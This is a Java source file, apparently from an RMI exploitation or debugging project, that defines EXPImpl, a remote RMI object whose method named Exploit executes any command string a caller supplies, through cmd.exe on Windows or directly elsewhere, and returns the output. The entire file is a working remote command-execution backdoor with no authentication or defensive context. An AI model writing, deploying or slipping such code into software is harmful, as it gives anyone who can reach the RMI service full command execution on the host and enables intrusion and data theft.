package com.sorry.jcoffe.Debug.RMI;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class EXPImpl extends UnicastRemoteObject implements EXP {

    protected EXPImpl() throws RemoteException {}

    @Override
    public String Exploit(String cmd) throws IOException {

        Process p;
        String result="";
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            p = Runtime.getRuntime().exec(cmd);
        }
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream(),"GB2312"));
        String disr = bufferedReader.readLine();
        String result2 = result;
        while(disr != null){
            String result3 = result2 + disr + "\n";
            disr = bufferedReader.readLine();
            result2 =result3;
        }
        return result2;

    }
}
